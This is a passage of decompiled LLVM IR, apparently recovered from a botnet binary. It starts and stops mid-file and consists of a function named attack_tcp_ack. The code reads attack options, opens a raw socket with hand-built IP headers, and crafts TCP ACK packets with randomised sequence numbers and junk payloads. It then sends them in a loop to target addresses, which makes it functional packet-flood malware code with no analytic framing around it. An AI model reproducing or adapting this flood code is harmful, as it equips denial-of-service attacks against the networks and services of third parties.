  uselistorder i32 136, { 0, 1, 4, 2, 3 }
  uselistorder i32 376, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 392, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804b802, { 1, 0 }
  uselistorder label %dec_label_pc_804b738, { 1, 0 }
  uselistorder label %dec_label_pc_804b6d9, { 1, 0 }
  uselistorder label %dec_label_pc_804b5f9, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_804b4d1, { 1, 3, 0, 2 }
}

define i32 @attack_tcp_ack(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %v0_804b862 = load i32, i32* @esi, align 4
  %v4_804b86c = zext i8 %arg2 to i32
  %v5_804b86c = load i32, i32* @eax, align 4
  %v6_804b86c = and i32 %v5_804b86c, -256
  %v7_804b86c = or i32 %v6_804b86c, %v4_804b86c
  store i32 %v7_804b86c, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804b86c, i32* %edx.global-to-local, align 4
  %v4_804b87c = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804b87c, i32* @ebx, align 4
  store i32 %v4_804b86c, i32* %stack_var_-156, align 4
  %v2_804b89f = zext i8 %arg2 to i64
  %v3_804b89f = call i32 @calloc(i64 %v2_804b89f, i32 4)
  store i32 %v3_804b89f, i32* @eax, align 4
  %v0_804b8ac = load i32, i32* @esi, align 4
  %v0_804b8ad = load i32, i32* @ebx, align 4
  %v4_804b8ae = trunc i32 %v0_804b8ad to i8
  %v5_804b8ae = call i32 @attack_get_opt_int(i8 %v4_804b8ae, i32 %v0_804b8ac, i32 2, i32 0)
  %v6_804b8ae = trunc i32 %v5_804b8ae to i8
  store i32 %v5_804b8ae, i32* @eax, align 4
  %v0_804b8c1 = load i32, i32* @esi, align 4
  %v0_804b8c2 = load i32, i32* @ebx, align 4
  store i32 %v0_804b8c2, i32* %stack_var_-156, align 4
  %v4_804b8c3 = trunc i32 %v0_804b8c2 to i8
  %v5_804b8c3 = call i32 @attack_get_opt_int(i8 %v4_804b8c3, i32 %v0_804b8c1, i32 3, i32 65535)
  %v6_804b8c3 = trunc i32 %v5_804b8c3 to i16
  store i32 %v5_804b8c3, i32* @eax, align 4
  %v0_804b8d0 = load i32, i32* @esi, align 4
  %v0_804b8d1 = load i32, i32* @ebx, align 4
  %v4_804b8d2 = trunc i32 %v0_804b8d1 to i8
  %v5_804b8d2 = call i32 @attack_get_opt_int(i8 %v4_804b8d2, i32 %v0_804b8d0, i32 4, i32 64)
  store i32 %v5_804b8d2, i32* @eax, align 4
  %v0_804b8e2 = load i32, i32* @esi, align 4
  %v0_804b8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804b8e3, i32* %stack_var_-156, align 4
  %v4_804b8e4 = trunc i32 %v0_804b8e3 to i8
  %v5_804b8e4 = call i32 @attack_get_opt_int(i8 %v4_804b8e4, i32 %v0_804b8e2, i32 5, i32 0)
  %v6_804b8e4 = trunc i32 %v5_804b8e4 to i8
  store i32 %v5_804b8e4, i32* @eax, align 4
  %v0_804b8f4 = load i32, i32* @esi, align 4
  %v0_804b8f5 = load i32, i32* @ebx, align 4
  %v4_804b8f6 = trunc i32 %v0_804b8f5 to i8
  %v5_804b8f6 = call i32 @attack_get_opt_int(i8 %v4_804b8f6, i32 %v0_804b8f4, i32 6, i32 65535)
  %v6_804b8f6 = trunc i32 %v5_804b8f6 to i16
  store i32 %v5_804b8f6, i32* @eax, align 4
  %v0_804b909 = load i32, i32* @esi, align 4
  %v0_804b90a = load i32, i32* @ebx, align 4
  store i32 %v0_804b90a, i32* %stack_var_-156, align 4
  %v4_804b90b = trunc i32 %v0_804b90a to i8
  %v5_804b90b = call i32 @attack_get_opt_int(i8 %v4_804b90b, i32 %v0_804b909, i32 7, i32 65535)
  store i32 %v5_804b90b, i32* @eax, align 4
  %sext = mul i32 %v5_804b90b, 65536
  %v1_804b915 = sdiv i32 %sext, 65536
  store i32 %v1_804b915, i32* @ebp, align 4
  %v0_804b919 = load i32, i32* @esi, align 4
  %v0_804b91a = load i32, i32* @ebx, align 4
  %v4_804b91b = trunc i32 %v0_804b91a to i8
  %v5_804b91b = call i32 @attack_get_opt_int(i8 %v4_804b91b, i32 %v0_804b919, i32 16, i32 65535)
  store i32 %v5_804b91b, i32* @eax, align 4
  %v0_804b92e = load i32, i32* @esi, align 4
  %v0_804b92f = load i32, i32* @ebx, align 4
  store i32 %v0_804b92f, i32* %stack_var_-156, align 4
  %v4_804b930 = trunc i32 %v0_804b92f to i8
  %v5_804b930 = call i32 @attack_get_opt_int(i8 %v4_804b930, i32 %v0_804b92e, i32 17, i32 65535)
  store i32 %v5_804b930, i32* @eax, align 4
  %v0_804b93d = load i32, i32* @esi, align 4
  %v0_804b93e = load i32, i32* @ebx, align 4
  %v4_804b93f = trunc i32 %v0_804b93e to i8
  %v5_804b93f = call i32 @attack_get_opt_int(i8 %v4_804b93f, i32 %v0_804b93d, i32 10, i32 0)
  store i32 %v5_804b93f, i32* @eax, align 4
  %v0_804b94f = load i32, i32* @esi, align 4
  %v0_804b950 = load i32, i32* @ebx, align 4
  store i32 %v0_804b950, i32* %stack_var_-156, align 4
  %v4_804b951 = trunc i32 %v0_804b950 to i8
  %v5_804b951 = call i32 @attack_get_opt_int(i8 %v4_804b951, i32 %v0_804b94f, i32 11, i32 1)
  store i32 %v5_804b951, i32* @eax, align 4
  %v0_804b95e = load i32, i32* @esi, align 4
  %v0_804b95f = load i32, i32* @ebx, align 4
  %v4_804b960 = trunc i32 %v0_804b95f to i8
  %v5_804b960 = call i32 @attack_get_opt_int(i8 %v4_804b960, i32 %v0_804b95e, i32 12, i32 0)
  %v6_804b960 = trunc i32 %v5_804b960 to i8
  store i32 %v5_804b960, i32* @eax, align 4
  %v0_804b970 = load i32, i32* @esi, align 4
  %v0_804b971 = load i32, i32* @ebx, align 4
  store i32 %v0_804b971, i32* %stack_var_-156, align 4
  %v4_804b972 = trunc i32 %v0_804b971 to i8
  %v5_804b972 = call i32 @attack_get_opt_int(i8 %v4_804b972, i32 %v0_804b970, i32 13, i32 0)
  store i32 %v5_804b972, i32* @eax, align 4
  %v0_804b97f = load i32, i32* @esi, align 4
  %v0_804b980 = load i32, i32* @ebx, align 4
  %v4_804b981 = trunc i32 %v0_804b980 to i8
  %v5_804b981 = call i32 @attack_get_opt_int(i8 %v4_804b981, i32 %v0_804b97f, i32 14, i32 0)
  store i32 %v5_804b981, i32* @eax, align 4
  %v0_804b991 = load i32, i32* @esi, align 4
  %v0_804b992 = load i32, i32* @ebx, align 4
  store i32 %v0_804b992, i32* %stack_var_-156, align 4
  %v4_804b993 = trunc i32 %v0_804b992 to i8
  %v5_804b993 = call i32 @attack_get_opt_int(i8 %v4_804b993, i32 %v0_804b991, i32 15, i32 0)
  store i32 %v5_804b993, i32* @eax, align 4
  store i32 %v5_804b993, i32* @edi, align 4
  %v0_804b9a1 = load i32, i32* @esi, align 4
  %v0_804b9a2 = load i32, i32* @ebx, align 4
  %v4_804b9a3 = trunc i32 %v0_804b9a2 to i8
  %v5_804b9a3 = call i32 @attack_get_opt_int(i8 %v4_804b9a3, i32 %v0_804b9a1, i32 0, i32 512)
  store i32 %v5_804b9a3, i32* @eax, align 4
  %v0_804b9b3 = load i32, i32* @esi, align 4
  %v0_804b9b4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b9b4, i32* %stack_var_-156, align 4
  %v4_804b9b5 = trunc i32 %v0_804b9b4 to i8
  %v5_804b9b5 = call i32 @attack_get_opt_int(i8 %v4_804b9b5, i32 %v0_804b9b3, i32 1, i32 1)
  %v6_804b9b5 = trunc i32 %v5_804b9b5 to i8
  store i32 %v5_804b9b5, i32* @eax, align 4
  %v0_804b9ba = load i32, i32* @global_var_805a858.27, align 8
  %v0_804b9c7 = load i32, i32* @esi, align 4
  %v0_804b9c8 = load i32, i32* @ebx, align 4
  %v4_804b9c9 = trunc i32 %v0_804b9c8 to i8
  %v5_804b9c9 = call i32 @attack_get_opt_ip(i8 %v4_804b9c9, i32 %v0_804b9c7, i32 24, i32 %v0_804b9ba)
  store i32 %v5_804b9c9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-156, align 4
  %v2_804b9d7 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804b9e3 = add i32 %v2_804b9d7, %arg1
  store i32 %v2_804b9e3, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-156, align 4
  %v3_804b9f2 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_804b9fe = add i32 %v3_804b9f2, 1
  %v8_804b9fe = icmp eq i32 %v1_804b9fe, 0
  store i32 %v1_804b9fe, i32* %eax.global-to-local, align 4
  br i1 %v8_804b9fe, label %dec_label_pc_804be38, label %dec_label_pc_804ba05

dec_label_pc_804ba05:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  store i32 4, i32* %stack_var_-156, align 4
  %v2_804ba12 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v3_804b9f2, i32* %eax.global-to-local, align 4
  %v5_804ba23 = call i32 @__GI_setsockopt(i32 %v3_804b9f2, i32 0, i32 3, i32 %v2_804ba12, i32 4)
  %v1_804ba2b = add i32 %v5_804ba23, 1
  %v8_804ba2b = icmp eq i32 %v1_804ba2b, 0
  store i32 %v1_804ba2b, i32* %eax.global-to-local, align 4
  br i1 %v8_804ba2b, label %dec_label_pc_804be40, label %dec_label_pc_804ba32

dec_label_pc_804ba32:                             ; preds = %dec_label_pc_804ba05
  %sext8 = mul i32 %v5_804b8c3, 65536
  %v4_804ba32 = sdiv i32 %sext8, 65536
  store i32 %v4_804ba32, i32* %eax.global-to-local, align 4
  %sext9 = mul i32 %v5_804b8f6, 65536
  %v4_804ba36 = sdiv i32 %sext9, 65536
  store i32 %v4_804ba36, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804ba4c = icmp eq i8 %arg2, 0
  %.pre30 = add i32 %v5_804b9a3, 40
  br i1 %v4_804ba4c, label %dec_label_pc_804bbe9, label %dec_label_pc_804ba57

dec_label_pc_804ba57:                             ; preds = %dec_label_pc_804ba32
  %v1_804ba66 = trunc i32 %.pre30 to i16
  %v1_804ba73 = urem i32 %v5_804b951, 2
  %v1_804ba76 = urem i32 %v5_804b960, 2
  %v1_804ba89 = urem i32 %v5_804b972, 2
  %v1_804ba8c = urem i32 %v5_804b981, 2
  %v0_804ba97 = load i32, i32* @edi, align 4
  %v1_804ba9d = urem i32 %v0_804ba97, 2
  %v1_804baa0 = mul i32 %v5_804b93f, 32
  %v2_804baa7 = and i32 %v1_804baa0, 32
  store i32 %v2_804baa7, i32* %edx.global-to-local, align 4
  %v1_804baae = trunc i32 %v5_804b91b to i16
  %v2_804baae = call i16 @llvm.bswap.i16(i16 %v1_804baae)
  %v3_804baae = zext i16 %v2_804baae to i32
  store i32 %v3_804baae, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v2_804baf9 = call i16 @llvm.bswap.i16(i16 %v1_804ba66)
  %v2_804bb05 = call i16 @llvm.bswap.i16(i16 %v6_804b8c3)
  %v3_804bb05 = zext i16 %v2_804bb05 to i32
  %v5_804bb05 = and i32 %v4_804ba32, -65536
  %v6_804bb05 = or i32 %v3_804bb05, %v5_804bb05
  %v4_804bb0d = urem i32 %v5_804b8d2, 256
  %v4_804bb17 = icmp eq i8 %v6_804b8e4, 0
  %v3_804bb39 = add i32 %arg3, 16
  %v2_804bb44 = call i16 @llvm.bswap.i16(i16 %v6_804b8f6)
  %v4_804bba8 = icmp eq i8 %v6_804b960, 0
  %v1_804bb14 = trunc i32 %v5_804b8d2 to i8
  %v12_804bb73 = or i32 %v1_804ba9d, %v2_804baa7
  br label %dec_label_pc_804bac1

dec_label_pc_804bac1:                             ; preds = %dec_label_pc_804bbb7.dec_label_pc_804bac1_crit_edge, %dec_label_pc_804ba57
  store i32 1510, i32* %stack_var_-156, align 4
  %v3_804baca = call i32 @calloc(i64 1510, i32 1)
  %v2_804bad3 = load i32, i32* @ebx, align 4
  %v3_804bad3 = mul i32 %v2_804bad3, 4
  %v4_804bad3 = add i32 %v3_804bad3, %v3_804b89f
  %v5_804bad3 = inttoptr i32 %v4_804bad3 to i32*
  store i32 %v3_804baca, i32* %v5_804bad3, align 4
  store i32 %v3_804b89f, i32* %eax.global-to-local, align 4
  %v3_804bada = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804bada, i32* %edx.global-to-local, align 4
  %v2_804bae1 = mul i32 %v3_804bada, 4
  %v3_804bae1 = add i32 %v2_804bae1, %v3_804b89f
  %v4_804bae1 = inttoptr i32 %v3_804bae1 to i32*
  %v5_804bae1 = load i32, i32* %v4_804bae1, align 4
  store i32 %v5_804bae1, i32* @ebx, align 4
  %v1_804bae4 = inttoptr i32 %v5_804bae1 to i8*
  store i8 69, i8* %v1_804bae4, align 1
  %v0_804bae7 = load i32, i32* @ebx, align 4
  %v1_804bae7 = add i32 %v0_804bae7, 20
  store i32 %v1_804bae7, i32* %esi.global-to-local, align 4
  %v1_804baee = add i32 %v0_804bae7, 40
  store i32 %v1_804baee, i32* @edi, align 4
  %v3_804baf1 = add i32 %v0_804bae7, 1
  %v4_804baf1 = inttoptr i32 %v3_804baf1 to i8*
  store i8 %v6_804b8ae, i8* %v4_804baf1, align 1
  %v2_804bafd = load i32, i32* @ebx, align 4
  %v3_804bafd = add i32 %v2_804bafd, 2
  %v4_804bafd = inttoptr i32 %v3_804bafd to i16*
  store i16 %v2_804baf9, i16* %v4_804bafd, align 2
  store i32 %v6_804bb05, i32* %eax.global-to-local, align 4
  %v2_804bb09 = load i32, i32* @ebx, align 4
  %v3_804bb09 = add i32 %v2_804bb09, 4
  %v4_804bb09 = inttoptr i32 %v3_804bb09 to i16*
  store i16 %v2_804bb05, i16* %v4_804bb09, align 2
  %v5_804bb0d = load i32, i32* %eax.global-to-local, align 4
  %v6_804bb0d = and i32 %v5_804bb0d, -256
  %v7_804bb0d = or i32 %v6_804bb0d, %v4_804bb0d
  store i32 %v7_804bb0d, i32* %eax.global-to-local, align 4
  %v2_804bb14 = load i32, i32* @ebx, align 4
  %v3_804bb14 = add i32 %v2_804bb14, 8
  %v4_804bb14 = inttoptr i32 %v3_804bb14 to i8*
  store i8 %v1_804bb14, i8* %v4_804bb14, align 1
  br i1 %v4_804bb17, label %dec_label_pc_804bb24, label %dec_label_pc_804bb1e

dec_label_pc_804bb1e:                             ; preds = %dec_label_pc_804bac1
  %v0_804bb1e = load i32, i32* @ebx, align 4
  %v1_804bb1e = add i32 %v0_804bb1e, 6
  %v2_804bb1e = inttoptr i32 %v1_804bb1e to i16*
  store i16 64, i16* %v2_804bb1e, align 2
  br label %dec_label_pc_804bb24

dec_label_pc_804bb24:                             ; preds = %dec_label_pc_804bac1, %dec_label_pc_804bb1e
  %v0_804bb24 = load i32, i32* @ebx, align 4
  %v1_804bb24 = add i32 %v0_804bb24, 9
  %v2_804bb24 = inttoptr i32 %v1_804bb24 to i8*
  store i8 6, i8* %v2_804bb24, align 1
  %v1_804bb2c = load i32, i32* @ebx, align 4
  %v2_804bb2c = add i32 %v1_804bb2c, 12
  %v3_804bb2c = inttoptr i32 %v2_804bb2c to i32*
  store i32 %v5_804b9c9, i32* %v3_804bb2c, align 4
  %v0_804bb2f = load i32, i32* %edx.global-to-local, align 4
  %v3_804bb2f = mul i32 %v0_804bb2f, 3
  store i32 %v3_804bb2f, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804bb39 = mul i32 %v0_804bb2f, 24
  %v4_804bb39 = add i32 %v3_804bb39, %v2_804bb39
  %v5_804bb39 = inttoptr i32 %v4_804bb39 to i32*
  %v6_804bb39 = load i32, i32* %v5_804bb39, align 4
  %v1_804bb3d = load i32, i32* @ebx, align 4
  %v2_804bb3d = add i32 %v1_804bb3d, 16
  %v3_804bb3d = inttoptr i32 %v2_804bb3d to i32*
  store i32 %v6_804bb39, i32* %v3_804bb3d, align 4
  %v2_804bb48 = load i32, i32* @ebx, align 4
  %v3_804bb48 = add i32 %v2_804bb48, 20
  %v4_804bb48 = inttoptr i32 %v3_804bb48 to i16*
  store i16 %v2_804bb44, i16* %v4_804bb48, align 2
  %v0_804bb4c = load i32, i32* @ebp, align 4
  %v1_804bb4e = trunc i32 %v0_804bb4c to i16
  %v2_804bb4e = call i16 @llvm.bswap.i16(i16 %v1_804bb4e)
  %v2_804bb52 = load i32, i32* %esi.global-to-local, align 4
  %v3_804bb52 = add i32 %v2_804bb52, 2
  %v4_804bb52 = inttoptr i32 %v3_804bb52 to i16*
  store i16 %v2_804bb4e, i16* %v4_804bb52, align 2
  store i32 %v3_804baae, i32* %eax.global-to-local, align 4
  %v1_804bb5a = load i32, i32* %esi.global-to-local, align 4
  %v2_804bb5a = add i32 %v1_804bb5a, 4
  %v3_804bb5a = inttoptr i32 %v2_804bb5a to i32*
  store i32 %v3_804baae, i32* %v3_804bb5a, align 4
  %v0_804bb5d = load i32, i32* %esi.global-to-local, align 4
  %v1_804bb5d = add i32 %v0_804bb5d, 12
  %v2_804bb5d = inttoptr i32 %v1_804bb5d to i8*
  %v3_804bb5d = load i8, i8* %v2_804bb5d, align 1
  %tmp = urem i8 %v3_804bb5d, 16
  %v1_804bb60 = zext i8 %tmp to i32
  %v1_804bb63 = or i32 %v1_804bb60, 80
  %v3_804bb63 = trunc i32 %v1_804bb63 to i8
  store i32 %v1_804bb63, i32* %eax.global-to-local, align 4
  store i8 %v3_804bb63, i8* %v2_804bb5d, align 1
  %v0_804bb69 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bb69 = add i32 %v0_804bb69, 13
  %v2_804bb69 = inttoptr i32 %v1_804bb69 to i8*
  %v3_804bb69 = load i8, i8* %v2_804bb69, align 1
  %v4_804bb69 = zext i8 %v3_804bb69 to i32
  %v5_804bb69 = load i32, i32* %eax.global-to-local, align 4
  %v4_804bb69.masked = and i32 %v4_804bb69, 192
  %v5_804bb6f = load i32, i32* %edx.global-to-local, align 4
  %v6_804bb6f = and i32 %v5_804bb6f, 268435200
  %v7_804bb6f = or i32 %v6_804bb6f, %v1_804ba73
  %v14_804bb73 = and i32 %v5_804bb69, -256
  %v5_804bb77 = load i32, i32* @ecx, align 4
  %v6_804bb77 = and i32 %v5_804bb77, 536870656
  %v7_804bb77 = or i32 %v6_804bb77, %v1_804ba76
  %v2_804bb7b = mul nuw i32 %v7_804bb6f, 16
  %v2_804bb7e = mul nuw i32 %v7_804bb77, 8
  %v6_804bb86 = and i32 %v2_804bb7b, 1073737728
  %v7_804bb86 = or i32 %v6_804bb86, %v1_804ba89
  %v2_804bb8a = mul nuw i32 %v7_804bb86, 4
  %v6_804bb91 = and i32 %v2_804bb8a, 2147467264
  %v7_804bb91 = or i32 %v6_804bb91, %v1_804ba8c
  %v2_804bb95 = mul nuw i32 %v7_804bb91, 2
  store i32 %v2_804bb95, i32* %edx.global-to-local, align 4
  %v15_804bb73 = or i32 %v12_804bb73, %v4_804bb69.masked
  %v1_804bb83.masked = or i32 %v15_804bb73, %v14_804bb73
  %v2_804bb8d.masked = or i32 %v1_804bb83.masked, %v2_804bb7b
  %v1_804bb97 = or i32 %v2_804bb8d.masked, %v2_804bb7e
  %v2_804bb9a = or i32 %v1_804bb97, %v2_804bb8a
  %v6_804bb9c18 = or i32 %v2_804bb9a, %v2_804bb95
  %v6_804bb9c = trunc i32 %v6_804bb9c18 to i8
  store i32 %v6_804bb9c18, i32* %eax.global-to-local, align 4
  store i8 %v6_804bb9c, i8* %v2_804bb69, align 1
  %v0_804bba3 = load i32, i32* %stack_var_-156, align 4
  %v1_804bba3 = call i32 @rand_next(i32 %v0_804bba3)
  %v2_804bba3 = trunc i32 %v1_804bba3 to i16
  store i32 %v1_804bba3, i32* %eax.global-to-local, align 4
  %v3_804bbad = load i32, i32* %esi.global-to-local, align 4
  %v4_804bbad = add i32 %v3_804bbad, 14
  %v5_804bbad = inttoptr i32 %v4_804bbad to i16*
  store i16 %v2_804bba3, i16* %v5_804bbad, align 2
  br i1 %v4_804bba8, label %dec_label_pc_804bbb7, label %dec_label_pc_804bbb3

dec_label_pc_804bbb3:                             ; preds = %dec_label_pc_804bb24
  %v0_804bbb3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bbb3 = add i32 %v0_804bbb3, 13
  %v2_804bbb3 = inttoptr i32 %v1_804bbb3 to i8*
  %v3_804bbb3 = load i8, i8* %v2_804bbb3, align 1
  %v4_804bbb3 = or i8 %v3_804bbb3, 8
  store i8 %v4_804bbb3, i8* %v2_804bbb3, align 1
  br label %dec_label_pc_804bbb7

dec_label_pc_804bbb7:                             ; preds = %dec_label_pc_804bb24, %dec_label_pc_804bbb3
  store i32 %v5_804b9a3, i32* @esi, align 4
  %v0_804bbbe = load i32, i32* @edi, align 4
  store i32 %v0_804bbbe, i32* %stack_var_-156, align 4
  %v2_804bbbf = inttoptr i32 %v0_804bbbe to i8*
  %v3_804bbbf = call i32 @rand_alphastr(i8* %v2_804bbbf, i32 %v5_804b9a3)
  store i32 %v3_804bbbf, i32* %eax.global-to-local, align 4
  store i32 %v5_804b9a3, i32* %edx.global-to-local, align 4
  %v1_804bbc8 = load i32, i32* @ebx, align 4
  %v3_804bbc8 = add i32 %v1_804bbc8, %.pre30
  %v4_804bbc8 = inttoptr i32 %v3_804bbc8 to i8*
  store i8 0, i8* %v4_804bbc8, align 1
  %v3_804bbcd = load i32, i32* %stack_var_-20, align 4
  %v1_804bbd4 = add i32 %v3_804bbcd, 1
  store i32 %v1_804bbd4, i32* @ebx, align 4
  store i32 %v1_804bbd4, i32* %stack_var_-20, align 4
  %v5_804bbe3 = icmp slt i32 %v1_804bbd4, %v4_804b86c
  br i1 %v5_804bbe3, label %dec_label_pc_804bbb7.dec_label_pc_804bac1_crit_edge, label %dec_label_pc_804bbe9

dec_label_pc_804bbb7.dec_label_pc_804bac1_crit_edge: ; preds = %dec_label_pc_804bbb7
  br label %dec_label_pc_804bac1

dec_label_pc_804bbe9:                             ; preds = %dec_label_pc_804bbb7, %dec_label_pc_804ba32
  %v1_804bbf1 = add i32 %v5_804b9a3, 20
  store i32 %v1_804bbf1, i32* %eax.global-to-local, align 4
  store i32 %.pre30, i32* %edx.global-to-local, align 4
  %v1_804bc1b = trunc i32 %v1_804bbf1 to i16
  %v2_804bc1b = call i16 @llvm.bswap.i16(i16 %v1_804bc1b)
  %v3_804bc1b = zext i16 %v2_804bc1b to i32
  %v13_804bc30 = icmp eq i32 %v5_804b9c9, -1
  %v13_804bd75 = icmp eq i16 %v6_804b8c3, -1
  %v13_804bc47 = icmp eq i16 %v6_804b8f6, -1
  %v12_804bc5d = icmp eq i32 %v5_804b91b, 65535
  %v12_804bdd5 = icmp eq i32 %v5_804b930, 65535
  %v4_804bc79 = icmp eq i8 %v6_804b9b5, 0
  %v1_804bc7e = icmp eq i1 %v4_804bc79, false
  %v3_804bd48 = add i32 %arg3, 20
  %v1_804bd7e = icmp eq i1 %v13_804bd75, false
  %v1_804bde0 = icmp eq i1 %v12_804bdd5, false
  %v6_804bcca = and i32 %arg3, -65536
  %v1_804bdc4 = icmp eq i1 %v12_804bc5d, false
  %v1_804bd93 = icmp eq i1 %v13_804bc47, false
  %v1_804bd69 = icmp eq i1 %v13_804bc30, false
  br label %dec_label_pc_804bbff

dec_label_pc_804bbff:                             ; preds = %dec_label_pc_804be21, %dec_label_pc_804bbe9
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v4_804ba4c, label %dec_label_pc_804be21, label %dec_label_pc_804bc12

dec_label_pc_804bc12:                             ; preds = %dec_label_pc_804bbff
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %v3_804bc1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd06

dec_label_pc_804bc30:                             ; preds = %dec_label_pc_804bd06
  br i1 %v13_804bc30, label %dec_label_pc_804bd70, label %dec_label_pc_804bc3b

dec_label_pc_804bc3b:                             ; preds = %bb91, %dec_label_pc_804bc30
  br i1 %v13_804bd75, label %dec_label_pc_804bd84, label %dec_label_pc_804bc47

dec_label_pc_804bc47:                             ; preds = %dec_label_pc_804bd70, %dec_label_pc_804bc3b
  br i1 %v13_804bc47, label %dec_label_pc_804bda0, label %dec_label_pc_804bc53

dec_label_pc_804bc53:                             ; preds = %dec_label_pc_804bd84, %dec_label_pc_804bc47
  %v0_804bc53 = load i32, i32* @ebp, align 4
  %v1_804bc53 = trunc i32 %v0_804bc53 to i16
  %v11_804bc53 = icmp eq i16 %v1_804bc53, -1
  br i1 %v11_804bc53, label %dec_label_pc_804bdb3, label %dec_label_pc_804bc5d

dec_label_pc_804bc5d:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bc53
  br i1 %v12_804bc5d, label %dec_label_pc_804bdd0, label %dec_label_pc_804bc6b

dec_label_pc_804bc6b:                             ; preds = %dec_label_pc_804bdb3, %dec_label_pc_804bc5d
  br i1 %v12_804bdd5, label %dec_label_pc_804bde6, label %dec_label_pc_804bc79

dec_label_pc_804bc79:                             ; preds = %dec_label_pc_804bdd0, %dec_label_pc_804bc6b
  br i1 %v1_804bc7e, label %dec_label_pc_804be00, label %dec_label_pc_804bc84

dec_label_pc_804bc84:                             ; preds = %dec_label_pc_804bde6, %dec_label_pc_804bc79, %dec_label_pc_804be00
  %v0_804bc84 = load i32, i32* @esi, align 4
  %v1_804bc84 = add i32 %v0_804bc84, 10
  %v2_804bc84 = inttoptr i32 %v1_804bc84 to i16*
  store i16 0, i16* %v2_804bc84, align 2
  %v0_804bc8e = load i32, i32* @esi, align 4
  store i32 %v0_804bc8e, i32* %stack_var_-156, align 4
  %v2_804bc8f = inttoptr i32 %v0_804bc8e to i16*
  %v3_804bc8f = call i32 @checksum_generic(i16* %v2_804bc8f, i32 20)
  %v4_804bc8f = trunc i32 %v3_804bc8f to i16
  %v3_804bc94 = load i32, i32* @esi, align 4
  %v4_804bc94 = add i32 %v3_804bc94, 10
  %v5_804bc94 = inttoptr i32 %v4_804bc94 to i16*
  store i16 %v4_804bc8f, i16* %v5_804bc94, align 2
  %v0_804bc9c = load i32, i32* @edi, align 4
  %v1_804bc9c = add i32 %v0_804bc9c, 16
  %v2_804bc9c = inttoptr i32 %v1_804bc9c to i16*
  store i16 0, i16* %v2_804bc9c, align 2
  store i32 %v3_804bc1b, i32* %eax.global-to-local, align 4
  %v0_804bca8 = load i32, i32* @edi, align 4
  %v0_804bca9 = load i32, i32* @esi, align 4
  %v4_804bcaa = inttoptr i32 %v0_804bca8 to i16*
  %v5_804bcaa = call i32 @checksum_tcpudp(i32 %v0_804bca9, i16* %v4_804bcaa, i32 %v3_804bc1b)
  %v6_804bcaa = trunc i32 %v5_804bcaa to i16
  %v3_804bcaf = load i32, i32* @edi, align 4
  %v4_804bcaf = add i32 %v3_804bcaf, 16
  %v5_804bcaf = inttoptr i32 %v4_804bcaf to i16*
  store i16 %v6_804bcaa, i16* %v5_804bcaf, align 2
  %v3_804bcb3 = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804bcc7 = mul i32 %v3_804bcb3, 24
  %v3_804bcc7 = add i32 %v2_804bcc7, %arg3
  store i32 %v3_804bcc7, i32* %eax.global-to-local, align 4
  %v0_804bcca = load i32, i32* @edi, align 4
  %v1_804bcca = add i32 %v0_804bcca, 2
  %v2_804bcca = inttoptr i32 %v1_804bcca to i16*
  %v3_804bcca = load i16, i16* %v2_804bcca, align 2
  %v4_804bcca = zext i16 %v3_804bcca to i32
  %v7_804bcca = or i32 %v4_804bcca, %v6_804bcca
  store i32 %v7_804bcca, i32* %edx.global-to-local, align 4
  %v3_804bcce = add i32 %v3_804bcc7, 2
  %v4_804bcce = inttoptr i32 %v3_804bcce to i16*
  store i16 %v3_804bcca, i16* %v4_804bcce, align 2
  %v0_804bcd4 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804bcd4, i32* %stack_var_-156, align 4
  %v0_804bcdf = load i32, i32* @esi, align 4
  store i32 %v3_804b9f2, i32* %eax.global-to-local, align 4
  %v6_804bce5 = call i32 @__libc_sendto(i32 %v3_804b9f2, i32 %v0_804bcdf, i32 %.pre30, i32 16384, i32 %v0_804bcd4, i32 16)
  store i32 %v6_804bce5, i32* %eax.global-to-local, align 4
  %v3_804bcea = load i32, i32* %stack_var_-20, align 4
  %v1_804bcf1 = add i32 %v3_804bcea, 1
  store i32 %v1_804bcf1, i32* %edx.global-to-local, align 4
  store i32 %v1_804bcf1, i32* %stack_var_-20, align 4
  %v5_804bd00 = icmp slt i32 %v1_804bcf1, %v4_804b86c
  br i1 %v5_804bd00, label %dec_label_pc_804bd06, label %dec_label_pc_804be21

dec_label_pc_804bd06:                             ; preds = %dec_label_pc_804bc84, %dec_label_pc_804bc12
  %v0_804bd2a = phi i32 [ %v1_804bcf1, %dec_label_pc_804bc84 ], [ 0, %dec_label_pc_804bc12 ]
  store i32 %v3_804b89f, i32* %eax.global-to-local, align 4
  %v2_804bd0a = mul i32 %v0_804bd2a, 4
  %v3_804bd0a = add i32 %v2_804bd0a, %v3_804b89f
  %v4_804bd0a = inttoptr i32 %v3_804bd0a to i32*
  %v5_804bd0a = load i32, i32* %v4_804bd0a, align 4
